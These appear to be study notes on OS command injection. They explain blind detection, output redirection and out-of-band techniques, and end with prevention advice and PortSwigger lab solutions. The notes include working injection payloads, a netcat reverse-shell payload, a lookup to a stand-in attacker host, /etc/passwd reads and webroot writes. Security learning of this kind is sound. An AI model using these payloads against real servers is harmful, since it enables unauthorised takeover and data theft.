# OS Command Injection

Tags: Done
Status: Not started

[writeups](OS%20Command%20Injection/writeups%207ad726114f924240be9bc943ab494ff7.md)

# What is command Injection?

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

## Mechanism

in OS Command Injection the attacker can execute an OS commands on the server operating system through a web parameter delivered by the user or by an specific header in request or through the cookies.

for example an application provide a DNS lookup service and take the subdomain value from the user.

![Capture.PNG](OS%20Command%20Injection/Capture.png)

 

and deliver user input through “target” parameter to backend and it pass the parameter value to the following code 

```bash
shell_exec("nslookup  " . commandi($target))
```

we notice here the code without any sanitization so the attacker can inject an OS commands by separate the original command and payload with (; , || , &&) 

<aside>
💡 Depending on **where your input is being injected** you may need to **terminate the quoted context** (using `"` or `'`) before the commands.

</aside>

```bash
#Request 

target=example.com;whoami&form=submit
```

and the result will be the result of lookup on “example.com” and displaying the current OS user.

<aside>
💡 NOTE!!: we can inject OS commands on (windows , Unix based ) according to server operating system.

</aside>

---

## Simple OS command injection

here we can see the output of injecting OS  commands via the HTTP response as we saw from the previous example.

## **Blind OS command injection**

when an application is vulnerable to OS command injection and the

result of commands doesn’t return in the http response then we 

call it “blind OS command injection ” and it can be exploited 

by the following techniques.

### **Detecting blind OS command injection using time delays:**

we can use the time delay technique to confirm of vulnerable application 

we can use the following commands to cause time delay

```bash
& ping -c 10 127.0.0.1 &
& sleep 10 &
```

example —> “ [https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276](https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276) ”

### **Exploiting blind OS command injection by redirecting output:**

if the application serves static resources from the filesystem location `/var/www/static` then we can redirect the result of command 

to this directory and after injecting command we can get the 

result by visit the —> site.com/directory 

payload:

```bash
& whoami > /var/www/static/whoami.txt &
```

### **Exploiting blind OS command injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques**

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```bash

& nslookup kgji2ohoyw.web-attacker.com &
```

---

## Get reverse shell using netcat tool

first we should set netcat listener on our machine using 

```bash
nc -l -p 1234   # set a continous listener on port 1234
```

then insert the following payload to connect to our machine 

```bash
vulnerable_parameter=1 & nc "my machine ip" 1234 -e /bin/sh &
```

and boom we get the shell.

<aside>
💡 for some useful bypass technics visit “[https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) ”

</aside>

<aside>
💡 for automation tool you can use “commix” tool

</aside>

### some injection cases base on OS

```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful
0x0a**ls**   # new line
****/n **ls** 

#Not executed but may be interesting (used in blind os command ijection )
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

### some parameters potentially is vulnerable

```bash
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

---

## How to prevent

The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code.

but there are more technics for prevention like:

1. **Escape values added to OS commands specific to each OS**
    
    for example using “escapeshellarg()” in PHP to surrounds the user input in single quotes so only the original command will be executed 
    
2. **Parameterization in conjunction with Input Validation**
    
    for example separate between the data and commands by validating based on black list of characters or white list of commands. 
    

lab 1 :simple case

```sql
|+whoami+|
```

lab 2  : **Blind OS [command injection](https://portswigger.net/web-security/os-command-injection) with time delays**

```sql
 ||+ping+-c+10 127.0.0.1+||      //  ctrl + u 
 &+sleep+10+&                   //  ctrl +u  
```

lab 3 : **Blind OS command injection with output redirection**  

```sql
||+whoami+>+/var/www/images/who.txt+||
```